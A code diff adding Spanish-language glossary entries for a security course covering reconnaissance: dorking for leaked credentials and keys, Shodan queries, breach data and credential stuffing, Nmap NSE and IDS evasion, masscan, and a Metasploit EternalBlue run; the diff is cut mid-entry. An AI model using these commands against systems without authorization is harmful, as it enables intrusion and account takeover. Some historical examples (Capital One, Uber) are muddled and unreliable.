@@ -2902,6 +2902,185 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["OSINT", "Reconocimiento pasivo vs activo", "Shodan y Censys"],
   },
+  {
+    id: 284,
+    module: 25,
+    term: "Subdomain enumeration moderno (amass, subfinder, crt.sh)",
+    short: "Combinar Certificate Transparency logs + brute force + APIs de terceros para mapear TODA la superficie de un dominio.",
+    detail:
+      "Un solo dominio (`tesla.com`) suele tener **cientos de subdominios** con exposiciones dispares. El moderno recon combina 3 técnicas paralelas:\n" +
+      "\n**1. Certificate Transparency (crt.sh, Censys):**\n" +
+      "Cada cert SSL emitido por CA moderna se publica en logs públicos. Query:\n" +
+      "```\ncurl -s 'https://crt.sh/?q=%.tesla.com&output=json' | jq -r '.[].name_value' | sort -u\n```\nRecupera subdominios que hicieron cert alguna vez — incluye **staging, dev, internal** que nunca aparecieron en DNS público.\n" +
+      "\n**2. Passive DNS + APIs de terceros (subfinder):**\n" +
+      "```\nsubfinder -d tesla.com -all -recursive\n```\n" +
+      "Consulta 30+ fuentes: SecurityTrails, VirusTotal, PassiveTotal, DNSDumpster, Shodan, GitHub, WaybackMachine, AlienVault OTX.\n" +
+      "\n**3. Brute-force + permutations (amass, puredns):**\n" +
+      "```\namass enum -active -d tesla.com -brute -w subdomains-top1m-5000.txt\npuredns bruteforce wordlist.txt tesla.com -r resolvers.txt\n```\n" +
+      "**Permutation-based**: descubre `dev-api.tesla.com`, `staging.api-v2.tesla.com` combinando patterns con subdomains ya conocidos.\n" +
+      "\n**4. HTTP fingerprint (httpx):**\nDespués de resolver, pasar por httpx para filtrar los que están vivos + tech stack:\n" +
+      "```\nsubfinder -d tesla.com | httpx -status-code -tech-detect -title\n```\n" +
+      "\n**5. Orquestación (recon-ng, ProjectDiscovery pipeline):**\n" +
+      "```\nsubfinder -d tesla.com | httpx | nuclei -t cves/ -severity critical\n```\n" +
+      "El pipeline recon → alive check → vuln scanner es el estándar moderno.\n" +
+      "> 💡 **crt.sh permite dorking retroactivo:** subdominios que existieron 3 años atrás y ya no aparecen en DNS público, pero cuyos hosts pueden seguir vivos.\n" +
+      "> ⚠️ Wildcard DNS (`*.tesla.com → CDN`) genera ruido — todos los subdominios random resuelven. Filtrar con httpx status codes.",
+    examples: [
+      "chaos-client de ProjectDiscovery: subdominios de bug bounty programs actualizados en tiempo real.",
+      "assetfinder de tomnomnom: quick-and-dirty subdomain enum.",
+      "Amass DB (SQLite) persiste todo el recon histórico de un target para diffing entre engagements.",
+    ],
+    related: ["Reconocimiento pasivo vs activo", "OSINT", "Google Dorking avanzado y GitHub dorking", "Shodan/Censys queries avanzadas"],
+  },
+  {
+    id: 285,
+    module: 25,
+    term: "Google Dorking avanzado y GitHub dorking",
+    short: "Operadores de búsqueda que descubren credenciales, paneles admin, backups .sql, y secretos en repos públicos.",
+    detail:
+      "**Google Dorking** (a veces llamado *Google Hacking*) usa operadores de búsqueda para descubrir información sensible indexada. El repositorio de referencia es el **Google Hacking Database (GHDB)** de exploit-db.\n" +
+      "\n**Operadores clave:**\n" +
+      "| Operator | Uso | Ejemplo |\n" +
+      "|---|---|---|\n" +
+      "| `site:` | Restringe a un dominio | `site:tesla.com` |\n" +
+      "| `filetype:` (o `ext:`) | Tipo de archivo | `filetype:pdf` |\n" +
+      "| `intitle:` | Palabra en `<title>` | `intitle:\"index of\"` |\n" +
+      "| `inurl:` | Palabra en URL | `inurl:admin` |\n" +
+      "| `intext:` | Palabra en body | `intext:\"api_key\"` |\n" +
+      "| `cache:` | Snapshot cacheado | `cache:target.com` |\n" +
+      "| `-word` | Excluir | `site:tesla.com -blog` |\n" +
+      "| `\"exact phrase\"` | Match exacto | `\"internal use only\"` |\n" +
+      "\n**Dorks emblemáticos (buscar SIEMPRE con permiso):**\n" +
+      "```\nsite:target.com filetype:sql\nsite:target.com intext:\"password\" filetype:txt\nsite:target.com intitle:\"index of\" (config|backup)\nsite:target.com ext:log\nsite:*.target.com intitle:\"login\" | \"admin\"\n```\n" +
+      "\n**GitHub Dorking** — quizás más valioso que Google en 2025. Los devs pushean secrets accidentalmente:\n" +
+      "```\n// GitHub Advanced Search\norg:target-org filename:.env password\norg:target-org \"aws_access_key_id\"\norg:target-org \"BEGIN RSA PRIVATE KEY\"\norg:target-org path:.git-credentials\n```\n" +
+      "\n**Herramientas de automation:**\n" +
+      "• **trufflehog** — escanea repos históricamente por 700+ patrones de secrets.\n" +
+      "• **gitleaks** — similar, más rápido, mejor para CI.\n" +
+      "• **GitDorker** — orquesta dorks contra la GitHub Search API.\n" +
+      "• **GHunt** — OSINT de cuentas Google.\n" +
+      "\n> 💡 **GHDB tiene 8000+ dorks catalogados** — muchos siguen siendo efectivos años después.\n" +
+      "> ⚠️ Escanear GitHub sin permiso puede violar TOS y leyes locales. Bug bounty scope específico primero.",
+    examples: [
+      "Uber 2016 (GitHub): AWS creds hardcoded en un repo público → 57M records.",
+      "trufflehog contra 20 repos de una org: ~5-15 findings promedio en 2024.",
+      "GitDorker + custom wordlist de la target-org: horas → minutos.",
+    ],
+    related: ["OSINT", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "Shodan/Censys queries avanzadas", "Email/employee OSINT y breach data"],
+  },
+  {
+    id: 286,
+    module: 25,
+    term: "Shodan/Censys queries avanzadas",
+    short: "Buscadores de dispositivos expuestos con filters específicos. Encuentra Kubernetes API pública, RDS abierto, ICS/SCADA.",
+    detail:
+      "**Shodan** y **Censys** indexan todo el IPv4 (y parte de IPv6) escaneando servicios expuestos. Con queries específicas encontrás **infra crítica expuesta accidentalmente**.\n" +
+      "\n**Shodan filters clave:**\n" +
+      "```\nport:22 org:\"Tesla Inc\"                 → SSH del target org\nssl.cert.subject.CN:target.com          → certs con CN específico\nhostname:.target.com                    → subdomains ya escaneados\ncountry:AR port:445 os:Windows          → SMB Windows en Argentina\nproduct:elasticsearch port:9200          → ES clusters expuestos\nvuln:CVE-2021-44228                      → hosts vulns a Log4Shell\n\"authentication disabled\" mongo         → MongoDB sin auth (ransomware target)\n\"200 OK\" \"Server: kubernetes\" api        → K8s API públicos\ntitle:\"Admin\" http.status:200            → paneles admin expuestos\n```\n" +
+      "\n**Censys — más granular en TLS/cert data:**\n" +
+      "```\nservices.tls.certificates.leaf_data.subject.common_name: target.com\nservices.software.vendor: `apache` and services.software.version: `2.4.49`\n```\n" +
+      "\n**Alternativas:**\n" +
+      "• **ZoomEye** (chino) — buena para Asia\n" +
+      "• **LeakIX** — bases de datos abiertas, indexa NoSQL/Elasticsearch\n" +
+      "• **BinaryEdge** — buena reputation, freemium\n" +
+      "• **Netlas** — nuevo, freemium generoso\n" +
+      "• **FOFA** (chino) — a menudo captura assets que Shodan pierde\n" +
+      "\n**Ejemplos históricos de findings:**\n" +
+      "• **AWS Elasticsearch expuesto en 2019** — Capital One reveló + Shodan dorks para `authentication disabled elasticsearch`.\n" +
+      "• **Kubernetes dashboards públicos** — miles indexados con `title:\"Kubernetes Dashboard\" http.status:200`.\n" +
+      "• **Cameras IoT default creds** — Mirai botnet (2016) usó dorks Shodan para escanear.\n" +
+      "\n**Uso ético (bug bounty):**\n" +
+      "1. Confirma que el asset está en scope del programa.\n" +
+      "2. Verifica ownership con TXT DNS record del bounty program.\n" +
+      "3. Nunca 'explotar' — reportar el finding con Shodan URL.\n" +
+      "> 💡 **Shodan Trends** muestra evolución histórica — útil para reportes 'estuvo expuesto por 3 meses'.\n" +
+      "> ⚠️ Shodan tiene API gratuita limitada. Membership CLI útil para bulk queries.",
+    examples: [
+      "Shodan CLI: `shodan search 'org:\"MyTarget\" product:elasticsearch'`.",
+      "Bug bounty: reporte con screenshot Shodan + timestamp + confirmed vuln.",
+      "Censys dorking para PoC de Log4Shell en 2021: `services.software.product: log4j and services.software.version: 2.14.1`.",
+    ],
+    related: ["OSINT", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "Reconocimiento pasivo vs activo", "Google Dorking avanzado y GitHub dorking"],
+  },
+  {
+    id: 287,
+    module: 25,
+    term: "OSINT frameworks: SpiderFoot, Maltego, recon-ng",
+    short: "Orquestadores que combinan 100+ fuentes en workflows automatizados. Del target a la cadena completa.",
+    detail:
+      "Los frameworks OSINT orquestan **decenas de fuentes** (DNS, WHOIS, Shodan, VirusTotal, HaveIBeenPwned, LinkedIn) y **conectan los dots** automáticamente. Ideal para engagement grandes.\n" +
+      "\n**1. SpiderFoot**\n" +
+      "Open source, 200+ modules. Corre queries paralelas y muestra grafo de relaciones.\n" +
+      "```\nspiderfoot -l 127.0.0.1:5001 -s target.com -t DOMAIN_NAME\n```\n" +
+      "Modules cubren: cuentas Twitter/GitHub de employees, breach data, subdomains, IPs, SSL history, exposed services.\n" +
+      "\n**2. Maltego**\n" +
+      "El más visual. Concepto: **entities** (dominios, IPs, personas) y **transforms** (queries que transforman una entity en otras). Community Edition gratis, Classic $$.\n" +
+      "\nWorkflow típico:\n" +
+      "1. Empezar con `domain:target.com`.\n" +
+      "2. Transform 'To DNS Names' → subdominios.\n" +
+      "3. Transform 'To IP Addresses' → hosting.\n" +
+      "4. Transform 'To Netblock owner' → cloud provider, ASN.\n" +
+      "5. Transform 'To Documents (WHOIS)' → contacts.\n" +
+      "6. Cross-reference con Maltego Have I Been Pwned transform.\n" +
+      "\n**3. recon-ng**\n" +
+      "Framework CLI estilo Metasploit para recon. Modulos organizados por categoría (`domains-domains`, `hosts-hosts`, `contacts-credentials`).\n" +
+      "```\nrecon-ng\n[recon-ng] > marketplace search subdomains\n[recon-ng] > modules load recon/domains-hosts/hackertarget\n[recon-ng] > options set SOURCE tesla.com\n[recon-ng] > run\n```\nLa data se persiste en SQLite; puede exportar a Neo4j para análisis de grafos.\n" +
+      "\n**4. theHarvester (rápido, focus emails/subdominios)**\n" +
+      "```\ntheHarvester -d tesla.com -l 500 -b all\n```\n" +
+      "\n**5. Frameworks nuevos (2023-2025):**\n" +
+      "• **OSINT-Framework** (osintframework.com) — árbol de decisión de herramientas por categoría.\n" +
+      "• **Sn1per** — automated recon full-suite (algunos módulos activos).\n" +
+      "• **AutoRecon** — orchestration para HTB/OSCP style.\n" +
+      "\n> 💡 **SpiderFoot HX** (versión cloud comercial) integra con Maltego para pipelines híbridos.\n" +
+      "> ⚠️ Muchos transforms de Maltego necesitan API keys de servicios pagos (Shodan, PassiveTotal) — el 'free tier' es limitado.",
+    examples: [
+      "SpiderFoot scan de un dominio target: ~2-4 horas full scan, produce cientos de datapoints.",
+      "Maltego + custom Python transforms para integrar herramientas propias.",
+      "recon-ng con Neo4j export para pentest reports visuales de grafos.",
+    ],
+    related: ["OSINT", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "Email/employee OSINT y breach data", "Reconocimiento pasivo vs activo"],
+  },
+  {
+    id: 288,
+    module: 25,
+    term: "Email/employee OSINT y breach data",
+    short: "Enumerar empleados + verificar credenciales filtradas es la base del initial access moderno (BEC, spear phishing, credential stuffing).",
+    detail:
+      "El **factor humano** es el vector primario de compromiso. Antes de phishing/social eng, mapeá **quién trabaja en el target** y **qué credenciales ya están filtradas**.\n" +
+      "\n**Enumeration de empleados:**\n" +
+      "\n**LinkedIn — la mina de oro:**\n" +
+      "• **Sales Navigator** — filtra por empresa + rol + antigüedad.\n" +
+      "• **CrossLinked** (herramienta) — permutations de nombres a formatos email (`first.last@`, `flast@`, `firstl@`).\n" +
+      "• **PhoneBook.cz** — email guessing por patterns organizacionales.\n" +
+      "\n**Hunter.io** — API de email discovery:\n" +
+      "```\ncurl https://api.hunter.io/v2/domain-search?domain=tesla.com&api_key=...\n```\nDevuelve emails known + patterns. Free tier limitado.\n" +
+      "\n**theHarvester + emailrep.io:**\n" +
+      "```\ntheHarvester -d target.com -b google,linkedin,twitter\n```\n" +
+      "\n**LinkedIn2Username, linkedin-scraper**: convertir nombres LI → email patterns.\n" +
+      "\n**Verificación de credenciales filtradas (breach data):**\n" +
+      "\n**Have I Been Pwned (HIBP):**\n" +
+      "• API pública: verificar si un email aparece en breaches conocidos.\n" +
+      "• 'Passwords' API (K-Anonymity): verificar si un password hash aparece filtrado sin revelar el password full.\n" +
+      "```\ncurl https://api.pwnedpasswords.com/range/21BD1  # primeros 5 chars del SHA1\n```\n" +
+      "\n**Combolists / dumps públicos:**\n" +
+      "• **DeHashed** — API paga con billones de credentials.\n" +
+      "• **LeakCheck** — similar.\n" +
+      "• **Snusbase** — el clásico ruso.\n" +
+      "• **IntelX** — mucha data de dark web.\n" +
+      "\n**Credential stuffing:**\nCon `<email>:<password>` pairs de breaches, herramientas como **Sentry MBA**, **OpenBullet**, **snipr** intentan el mismo par contra 200+ SaaS. Requiere IPs residenciales rotating (proxies) para evitar rate-limit.\n" +
+      "\n**Contexto para defenders:**\n" +
+      "• MFA obligatoria + resistente a phishing (FIDO2)\n" +
+      "• Password reuse detection (comparar hash pwnedpasswords en signup/login)\n" +
+      "• Monitoring de la propia empresa en HIBP + notificación proactiva a empleados\n" +
+      "\n> 💡 **En 2024 ~65% de empleados corporativos tienen ≥1 credential leaked en breaches conocidos** (Verizon DBIR).\n" +
+      "> ⚠️ Usar credentials filtradas contra targets **sin permiso explícito** es ilegal. Solo en pentest con autorización.",
+    examples: [
+      "Uber 2016 (parte 2): contractor con creds leaked + MFA push fatigue → account takeover.",
+      "SolarWinds initial access: LinkedIn recon + phishing spear al perfil técnico correcto.",
+      "Colonial Pipeline 2021: password reutilizado, aparecía en breach, sin MFA → ransomware $4.4M.",
+    ],
+    related: ["OSINT", "Ingeniería social", "MFA y autenticación moderna", "Ataques a MFA"],
+  },
 
   // ── M26 · Escaneo con Nmap ───────────────────────────────────────────────
   {
@@ -2966,6 +3145,189 @@ export const DEFINITIONS: ConceptDefinition[] = [
       "-D para esconder la IP real entre señuelos.",
     ],
     related: ["Tipos de escaneo Nmap", "Detección de anomalías en tráfico", "Reconocimiento pasivo vs activo"],
+  },
+  {
+    id: 294,
+    module: 26,
+    term: "NSE (Nmap Scripting Engine) avanzado",
+    short: "600+ scripts Lua categorizados (safe/intrusive/vuln) que convierten Nmap en scanner de vulnerabilidades. Categorías, args y custom scripts.",
+    detail:
+      "El **NSE** convierte Nmap de un port scanner a un framework de reconocimiento activo. Los scripts viven en `/usr/share/nmap/scripts/` (~600 en Nmap 7.94).\n" +
+      "\n**Categorías (organizadas por comportamiento):**\n" +
+      "| Categoría | Qué hace | Ejemplo |\n" +
+      "|---|---|---|\n" +
+      "| `safe` | No modifica ni crashea target | `http-title`, `ssh-hostkey` |\n" +
+      "| `default` (`-sC`) | Corre en cada scan por default | `banner`, `http-methods` |\n" +
+      "| `discovery` | Enumeración adicional | `dns-brute`, `smb-enum-shares` |\n" +
+      "| `version` | Detección precisa de versión | `http-server-header` |\n" +
+      "| `vuln` | Chequea CVEs conocidos (activo) | `http-shellshock`, `smb-vuln-ms17-010` |\n" +
+      "| `intrusive` | Puede crashear/DoS | `mysql-brute`, `smb-check-vulns` |\n" +
+      "| `brute` | Bruteforce credentials | `ssh-brute`, `http-form-brute` |\n" +
+      "| `exploit` | Ejecuta payload real | `smb-vuln-ms08-067` |\n" +
+      "| `malware` | Detecta backdoors conocidos | `ftp-vuln-cve2010-4221` |\n" +
+      "\n**Sintaxis:**\n" +
+      "```bash\n# Categorías\nnmap --script=safe target                         # todos los safe\nnmap --script=default,discovery target            # combinado\nnmap --script=\"not intrusive\" target              # exclude\n\n# Específicos\nnmap --script=smb-vuln-ms17-010 -p 445 target\nnmap --script=http-enum -p 80,443 target\n\n# Con args\nnmap --script=http-enum --script-args=http-enum.basepath='/api/' target\n```\n" +
+      "\n**Scripts críticos por vector:**\n" +
+      "```\nsmb-vuln-ms17-010          # EternalBlue (WannaCry)\nsmb-vuln-ms08-067          # Conficker (2008 pero aún se ve)\nssl-heartbleed             # CVE-2014-0160\nhttp-shellshock            # Bash CVE-2014-6271\nhttp-vuln-cve2017-5638     # Struts2 RCE (Equifax)\nvulners                    # busca CVEs de todas las versiones detectadas\n```\n" +
+      "\n**Custom scripts (Lua):**\n" +
+      "```lua\n-- /usr/share/nmap/scripts/mi-check.nse\ndescription = [[Verifica header X-Powered-By]]\nauthor = \"tuyo\"\nlicense = \"MIT\"\ncategories = {\"safe\", \"discovery\"}\n\nrequire \"http\"\nportrule = shortport.port_or_service({80, 443}, {\"http\", \"https\"})\n\naction = function(host, port)\n  local response = http.get(host, port, \"/\")\n  return response.header[\"x-powered-by\"] or \"header ausente\"\nend\n```\n" +
+      "Luego: `nmap --script=mi-check target`.\n" +
+      "> 💡 **`vulners`** (comunidad) es de los más útiles: cross-referencia banners detectados con base CVE en tiempo real.\n" +
+      "> ⚠️ Scripts `intrusive/brute/exploit` pueden bloquear cuentas, corromper datos o crashear servicios. Confirmar scope antes.",
+    examples: [
+      "`nmap -sV --script vuln -p- target` — barrido completo de vulnerabilidades.",
+      "Enumeración de shares Windows: `nmap --script=smb-enum-shares -p 445 target`.",
+      "Custom script para fingerprint de tecnología propia + integrar al pipeline de recon.",
+    ],
+    related: ["Tipos de escaneo Nmap", "Herramientas de enumeración", "Análisis de vulnerabilidades", "Firewall/IDS evasion con Nmap"],
+  },
+  {
+    id: 295,
+    module: 26,
+    term: "Firewall/IDS evasion con Nmap",
+    short: "Fragmentation, decoys, source port spoofing, timing lento, packet crafting. Cuando el target tiene defensas activas.",
+    detail:
+      "Un scan Nmap directo (`nmap -sS target`) es **muy visible**: un SYN por puerto, timing agresivo. Firewalls y IDS/IPS (Snort, Suricata) lo detectan trivialmente. Evasion es imprescindible en engagements realistas.\n" +
+      "\n**Técnicas principales:**\n" +
+      "\n**1. Fragmentation (`-f`, `--mtu N`)**\n" +
+      "```bash\nnmap -f target                       # fragmenta a 8 bytes\nnmap --mtu 24 target                 # fragment size custom\n```\nEl paquete IP se divide en fragments pequeños. IDS antiguos con state limitado no lo reensamblan y solo ven fragments sueltos.\n" +
+      "\n**2. Decoys (`-D`)**\n" +
+      "```bash\nnmap -D RND:10 target                       # 10 decoys random\nnmap -D 1.2.3.4,5.6.7.8,ME,9.10.11.12 target # decoys específicos + IP real\n```\nEl target ve **múltiples IPs origen**, no sabe cuál es la real. **ME** especifica la posición de tu IP real en la lista.\n" +
+      "\n**3. Source port spoof (`--source-port`, `-g`)**\n" +
+      "```bash\nnmap --source-port 53 target         # tráfico aparenta ser DNS response\nnmap -g 80 target                    # aparenta ser HTTP\n```\nFirewalls mal configurados whitelist DNS/HTTP source ports permitiendo tráfico a través.\n" +
+      "\n**4. Timing profiles (`-T0` a `-T5`)**\n" +
+      "```bash\n-T0  # Paranoid: 5min entre paquetes — indetectable pero horas\n-T1  # Sneaky: 15s\n-T2  # Polite: 0.4s, menos ancho de banda\n-T3  # Normal (default)\n-T4  # Aggressive: rápido, ok en LAN\n-T5  # Insane: sacrifica precisión por velocidad\n```\nPara evadir IDS con thresholds, `-T1` o `-T2` diluye el scan.\n" +
+      "\n**5. Spoof source IP (`-S`)**\n" +
+      "```bash\nnmap -S 10.0.0.99 -e eth0 -Pn target\n```\nHace el scan aparente venir de otra IP. No obtenés respuestas directas (van a la IP spoofed) — útil solo para triggering.\n" +
+      "\n**6. Idle scan (`-sI zombie`)**\n" +
+      "El más stealth. Usa un **host zombie** con IPID sequence predecible como proxy indirecto. El target ve el scan del zombie, no de vos. Requiere encontrar zombie válido.\n" +
+      "```bash\nnmap -sI zombie.example.com target\n```\n" +
+      "\n**7. Data length + padding (`--data-length N`, `--data 0xDEADBEEF`)**\n" +
+      "Cambia el tamaño/contenido del payload para evadir signatures de IDS.\n" +
+      "\n**8. Fragmentación IP + reorder**\n" +
+      "```bash\nnmap -f --mtu 8 --scan-delay 500ms target\n```\n" +
+      "\n**9. TTL manipulation (`--ttl N`)**\n" +
+      "Aparentar diferente distancia de red.\n" +
+      "\n**IDS/IPS modernos (Suricata, Zeek, Snort 3):**\n" +
+      "Detectan mucho de esto. La combinación `-f + -D + -T1 + -g 53` es un mejor baseline. Herramientas específicas: **Nmap NSE con --script=firewalk**, **hping3** para packet crafting custom.\n" +
+      "> 💡 En engagement legal, **coordinar con el blue team** para no gastar horas de investigación por scans conocidos.\n" +
+      "> ⚠️ Evasion no evade **network taps** o **passive monitoring** — solo IDS con reglas específicas.",
+    examples: [
+      "Combinación 'stealth': `nmap -sS -f -D RND:10 -T2 -g 53 --data-length 30 target`.",
+      "Comparar scan-detection: hacer 2 scans (default vs stealth) y correr Suricata local para ver diff de alerts.",
+      "En CTF/HTB: `-T4 -Pn` sin evasion (ya se sabe que hay scan) para ir rápido.",
+    ],
+    related: ["Tipos de escaneo Nmap", "NSE (Nmap Scripting Engine) avanzado", "Evasión de IDS/firewall", "Nmap performance tuning y masscan"],
+  },
+  {
+    id: 296,
+    module: 26,
+    term: "Nmap performance tuning y masscan",
+    short: "Cuando Nmap es demasiado lento (millones de IPs, /8), masscan/naabu/rustscan escanean a M packets/sec.",
+    detail:
+      "Nmap por defecto es **poderoso pero lento** en escala: un `-p-` (65535 puertos) por host lleva 10-30 min. Para escanear rangos grandes (`/16`, `/8`, IPv4 entero) hay herramientas específicas.\n" +
+      "\n**Nmap tuning (para squeeze más velocidad):**\n" +
+      "```bash\nnmap -T4 --min-parallelism 100 --max-retries 1 --host-timeout 30s --min-rate 300 -p- target\n```\n" +
+      "| Flag | Efecto |\n" +
+      "|---|---|\n" +
+      "| `--min-rate N` | Fuerza mínimo N pkts/sec |\n" +
+      "| `--max-retries N` | Reduce retries (default 10) |\n" +
+      "| `--host-timeout Ns` | Skip host si tarda más de N seg |\n" +
+      "| `--min-parallelism N` | Mínimo N conexiones paralelas |\n" +
+      "| `--defeat-rst-ratelimit` | Ignorar rate-limit del target |\n" +
+      "| `-Pn` | Skip host discovery (asume vivo) |\n" +
+      "| `-n` | No DNS resolution |\n" +
+      "\n**masscan — el rey de la velocidad:**\n" +
+      "Creado por Robert Graham. Puede escanear **10M pkts/sec** en 10G ethernet con async I/O (no OS TCP stack).\n" +
+      "```bash\nmasscan 0.0.0.0/0 -p 443 --rate 100000 --output-format json --output-filename https.json\nmasscan 10.0.0.0/8 -p 22,80,443,3389,8080 --rate 50000\n```\n" +
+      "Escanear todo IPv4 en un puerto: ~6 min con 10G. Downsides:\n" +
+      "• No hace service detection (solo status open/closed)\n" +
+      "• Requiere ser cuidadoso con ISP (parece DDoS)\n" +
+      "• Sintaxis en `-p 22` = puerto TCP solamente, `-pU:53` para UDP\n" +
+      "\n**Pipeline moderno: masscan → nmap sV**\n" +
+      "```bash\n# 1. Discovery ultra rápido\nmasscan 10.0.0.0/16 -p 1-65535 --rate 50000 -oL open-ports.txt\n\n# 2. Deep scan sobre lo encontrado\nnmap -sV -sC -p $(cat open-ports.txt | awk '{print $3}' | sort -u | tr '\\n' ',') -iL hosts.txt\n```\n" +
+      "\n**rustscan** (2019, Rust):\n" +
+      "```bash\nrustscan -a target -- -sV -sC       # deep scan de todo lo abierto\n```\nWrapper: descubre puertos rápido → pasa a Nmap para detalle. ~10× más rápido que Nmap solo.\n" +
+      "\n**naabu (ProjectDiscovery, Go):**\n" +
+      "```bash\nsubfinder -d target.com | naabu -p 80,443,8080,8443 -c 200\n```\nParte del pipeline recon → naabu → nuclei.\n" +
+      "\n**zmap:**\n" +
+      "Similar a masscan. Investigación académica (papers de mediciones IPv4).\n" +
+      "> 💡 **En OSCP time-boxed**, un pipeline masscan (30s) → nmap sobre open ports (2min) es superior a nmap sV solo (15min).\n" +
+      "> ⚠️ Escaneos masivos disparan alertas ISP. Usar sólo en scope de bug bounty explícito o con permiso del provider.",
+    examples: [
+      "IPv4 escaneo total port 443: masscan --rate 100000 en 6-10 min.",
+      "OSCP recon: `rustscan -a $ip --ulimit 5000 -- -sV -sC -oA nmap` como comando único.",
+      "ProjectDiscovery pipeline: `subfinder | dnsx | naabu | httpx | nuclei`.",
+    ],
+    related: ["Tipos de escaneo Nmap", "Firewall/IDS evasion con Nmap", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "NSE (Nmap Scripting Engine) avanzado"],
+  },
+  {
+    id: 297,
+    module: 26,
+    term: "UDP scanning avanzado y specialty scans",
+    short: "UDP es lento (10× TCP) por diseño del protocolo. Estrategias para hacerlo viable + otros scan types específicos.",
+    detail:
+      "**UDP scanning** es el punto ciego más común. Muchos servicios críticos (DNS 53, SNMP 161, NTP 123, TFTP 69, NetBIOS 137, IKE 500) son UDP. Pero UDP no tiene handshake — la detección es indirecta y lenta.\n" +
+      "\n**Por qué UDP es difícil:**\n" +
+      "| Estado | TCP | UDP |\n" +
+      "|---|---|---|\n" +
+      "| Open | SYN-ACK | Response de la app (a veces) |\n" +
+      "| Closed | RST | ICMP Port Unreachable |\n" +
+      "| Filtered | Sin response | Sin response |\n" +
+      "\n**Open|filtered** — el UDP tiene esa ambigüedad. Sin response puede ser open (app no responde) o filtered (firewall). Nmap intenta payloads específicos por puerto (`nmap-payloads`) para forzar respuesta:\n" +
+      "```\nSNMP (161): manda GET-Request con community 'public'\nDNS (53): manda query DNS estándar\nNetBIOS (137): manda NBSTAT request\n```\n" +
+      "\n**Estrategia UDP inteligente:**\n" +
+      "```bash\n# Solo top 100 UDP ports (más comunes)\nnmap -sU --top-ports 100 -T4 target\n\n# Específicos con scripts\nnmap -sU -p 53,161,123,500 --script=snmp-info,dns-brute target\n\n# Combined con TCP en un solo comando\nnmap -sS -sU -p T:22,80,443,U:53,161,500 target\n```\n" +
+      "\n**ICMP rate-limiting** — Linux rate-limita ICMP Port Unreachable (1 pkt/sec por default). Un scan UDP full contra Linux **puede tardar 18 horas**. Fix: usar `--min-rate` + `--defeat-icmp-ratelimit`.\n" +
+      "\n**Specialty scans útiles:**\n" +
+      "\n**ACK scan (`-sA`)** — no descubre puertos abiertos, sino **firewalls stateful**. Los puertos que responden RST son 'unfiltered' (probablemente sin firewall). Los que no responden son 'filtered'.\n" +
+      "\n**Window scan (`-sW`)** — como ACK pero interpreta TCP Window field. Algunos sistemas mandan window >0 en open ports, =0 en closed.\n" +
+      "\n**Maimon scan (`-sM`)** — FIN+ACK. Bypass de firewalls antiguos.\n" +
+      "\n**NULL scan (`-sN`), FIN scan (`-sF`), Xmas scan (`-sX`)** — packet crafting no-standard. Puede evadir stateless firewalls. Windows no responde estrictamente al RFC → no funciona bien contra Windows.\n" +
+      "\n**Idle scan (`-sI`)** — el más stealth: usa un zombie con IPID predecible como proxy.\n" +
+      "\n**Protocol scan (`-sO`)** — enumera qué **protocolos IP** (no puertos) están soportados (TCP=6, UDP=17, ICMP=1, GRE=47, IPSec ESP=50).\n" +
+      "\n**Traceroute (`--traceroute`)**\nMapea el path de red. Útil para identificar firewalls intermedios y CDNs.\n" +
+      "> 💡 En pentest interno con acceso local: UDP scan crítico revela servicios (SNMP con community 'public' es hallazgo dorado — vuelca toda la MIB).\n" +
+      "> ⚠️ SNMP UDP scans con `snmp-brute` NSE pueden crashear equipos legacy. Verificar scope.",
+    examples: [
+      "SNMP hallazgo clásico: `nmap -sU -p 161 --script=snmp-info,snmp-brute,snmp-processes target`.",
+      "ACK scan para firewall mapping: `nmap -sA -p- target` — puertos 'unfiltered' señalan la política del firewall.",
+      "Idle scan con zombie descubierto: `nmap -sI 192.168.1.100 target` — el target ve el zombie, no vos.",
+    ],
+    related: ["Tipos de escaneo Nmap", "Herramientas de enumeración", "Firewall/IDS evasion con Nmap", "NSE (Nmap Scripting Engine) avanzado"],
+  },
+  {
+    id: 298,
+    module: 26,
+    term: "Nmap output parsing y automation",
+    short: "XML output + herramientas como nmaptocsv, dnmap, o pipe a nuclei/httpx. Convertir recon en workflow reproducible.",
+    detail:
+      "En engagements reales, Nmap es **una etapa** del pipeline, no el resultado final. Automatizar output → siguientes tools es la diferencia entre 'pentest manual' y 'ops team'.\n" +
+      "\n**Formatos de output:**\n" +
+      "```bash\nnmap -sV target -oN normal.txt      # human readable\nnmap -sV target -oX result.xml       # XML (parseable)\nnmap -sV target -oG grep.txt         # grepable (una línea por host)\nnmap -sV target -oA scan             # normal + xml + grep (recomendado)\nnmap -sV target -oJ output.json      # JSON (Nmap 7.90+, requires libjq)\n```\n" +
+      "\n**Parsear XML — patrón canónico Python:**\n" +
+      "```python\nimport xml.etree.ElementTree as ET\ntree = ET.parse('scan.xml')\nroot = tree.getroot()\nfor host in root.findall('host'):\n    addr = host.find('address').get('addr')\n    for port in host.findall('.//port'):\n        state = port.find('state').get('state')\n        if state == 'open':\n            service = port.find('service').get('name', 'unknown')\n            print(f'{addr}:{port.get(\"portid\")} {service}')\n```\n" +
+      "\n**Herramientas de parsing:**\n" +
+      "• **nmaptocsv** — XML → CSV para spreadsheets/reports.\n" +
+      "• **Metasploit `db_import`** — importa XML directo a la DB de MSF.\n" +
+      "• **NmapParser** (Perl) — históricamente popular.\n" +
+      "• **python-libnmap** — parser Python maduro.\n" +
+      "\n**Pipelines de ProjectDiscovery:**\n" +
+      "```bash\n# Full recon pipeline\nsubfinder -d target.com -silent | \\\n  dnsx -a -resp-only | \\\n  naabu -p 80,443,8080,8443,3000,3306,6379,27017 -silent | \\\n  httpx -status-code -tech-detect -title -silent | \\\n  tee alive.txt | \\\n  nuclei -t cves/ -severity critical,high\n```\n" +
+      "\n**Nmap → Metasploit workflow:**\n" +
+      "```\n# En msfconsole\nmsf6 > db_import /tmp/scan.xml\nmsf6 > services -p 445    # todos los hosts con SMB\nmsf6 > vulns              # vulns detectadas por scripts\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS file:hosts.txt\nmsf6 > run\n```\n" +
+      "\n**Ndiff — diffing entre scans:**\n" +
